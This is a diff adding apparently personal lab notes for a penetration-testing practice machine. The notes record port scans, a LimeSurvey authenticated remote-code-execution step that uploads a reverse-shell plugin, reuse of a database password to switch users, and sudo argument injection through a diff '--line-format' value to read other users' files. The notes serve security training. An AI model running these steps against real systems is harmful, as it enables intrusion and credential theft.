@@ -1,0 +1,142 @@
+### Enumeration
+```
+IP=192.168.218.225
+sudo nmap -sU $IP
+sudo nmap -p- -vv $IP
+sudo nmap -p22,80 -A $IP
+```
+### Ports
+- Banner Grab: nc -nv $IP PORT
+- 22
+	- OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+	- nc -nv $IP 22
+		- SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
+- 80
+	- Apache httpd 2.4.41 ((Ubuntu))
+	- nc -nv $IP 80
+		- http
+### Foothold
+- 80
+	- Default landing page
+		- ![[Pasted image 20240719134646.png]]
+		- ![[Pasted image 20240719134700.png]]
+	- /about-us.html
+		- Ruby Foster
+		- Luis Oconnell
+		- Jackie Riggs
+		- Alfred Small
+		- Denis Mitchel
+	- Added marketing.pg to /etc/hosts
+	- Versions
+		- lime survey Version 5.3.24 
+			- authenticated RCE
+			- Followed this git hub
+				- https://github.com/Y1LD1R1M-1337/Limesurvey-RCE
+			- Edit rev .php to have lhost and lport
+			- Zipped file, uploaded plugin, activated plugin
+			- http://customers-survey.marketing.pg/upload/plugins/Y1LD1R1M/php-rev.php  >  RCE
+	- Directory Brute force
+		- dirsearch -u http://$IP
+			- /old
+				- Old version of website
+				- Source doe to customers-survey.marketing.pg  added to /etc/hosts
+			- /assets
+			- /vendor
+		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
+		- Found directories
+			- /old
+				- dirsearch -u http://$IP/old
+					- /old/assets/
+					- /old/vendor/
+	- Vulnerability scan
+		- nikto -h http://$IP
+	- customers-survey.marketing.pg
+		- ![[Pasted image 20240719135130.png]]
+		- dirsearch -u http://customers-survey.marketing.pg
+			- /admin
+				- ![[Pasted image 20240719135338.png]]
+				- admin:admin  -  incorrect username or password
+				- admin:password
+			- /composer.json
+			- /CONTRIBUTING.md
+			- /installer
+			- LICENSE
+			- /manifest.yml
+			- /package.json
+				- flush-promises	"^1.0.2"
+					- no easy google exploits
+			- /phpunit.xml
+				- ![[Pasted image 20240719135549.png]]
+				- tests/bootstrap.php
+					- ![[Pasted image 20240719135614.png]]
+					- Google phpunit exploit
+						- exploit db 50702  php unit 4.8.28 RCE unauthenticated
+			- /plugins
+				- forbidden
+			- /README.md
+			- /tests
+				- forbidden
+			- /themes
+			- /tmp
+			- /upload
+				- forbidden
+			- /yarn.lock
+### PE
+#### Linux
+- www-data
+	- id
+		- uid=33(www-data) gid=33(www-data) groups=33(www-data)
+	- sudo -l
+		- needs password
+	- uname -a
+		- `Linux marketing 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+	- getcap -r / 2>/dev/null
+		- nothing
+	- suid
+		- find / -type f -perm -04000 -ls 2>/dev/null
+			- nothing
+	- Users with console
+		- m.sander
+			- personal
+				- access denied
+		- t.miller
+			- local.txt
+		- root
+	- netstat -ano
+		- not installed
+	- linpeas
+		- Possible Exploits
+			- pwnkit
+		- Ports
+			- 3306
+			- 33060
+		- Interesting Files
+			- /var/www/LimeSurvey/framework/cli/views/webapp/protected/config/database.php
+				- root  no password  mysql
+			- /var/www/LimeSurvey/application/config/config.php
+				- limesurvey_user:`EzPwz2022_dev1$$23!!`  mysql
+				- su t.miller
+					- `EzPwz2022_dev1$$23!!  -  success
+- t.miller
+	- id
+		- uid=1000(t.miller) gid=1000(t.miller) groups=1000(t.miller),24(cdrom),46(plugdev),50(staff),100(users),119(mlocate)
+		- `find / -group mlocate 2>/dev/null | grep -v '^/proc\|^/run\|^/sys\|^/snap'
+			- /var/lib/mlocate/mlocate.db
+				- Find file - /home/m.sander/personal/creds-for-2022.txt
+			- /usr/bin/mlocate
+	- sudo -l
+		- (m.sander) /usr/bin/sync.sh
+			- ![[Pasted image 20240719143653.png]]
+			- ![[Pasted image 20240719143838.png]]
+			- Maybe can use the diff command to get sudo or other user?
+			- sudo -u m.sander /usr/bin/sync.sh '--line-format=%L /dev/null'
+				- ![[Pasted image 20240719144352.png]]
+				- Read the notes.txt file
+			- sudo -u m.sander /usr/bin/sync.sh '--line-format=%L /etc/passwd'
+				- Reads /etc/passwd
+				- maybe just as my user idk
+			- ln -sf /home/m.sander/personal/creds-for-2022.txt LFILE
+			- sudo -u m.sander /usr/bin/sync.sh /home/m.sander/personal/creds-for-2022.txt
+### Credentials
+- `t.miller:EzPwz2022_dev1$$23!!`
+### Lessons Learned
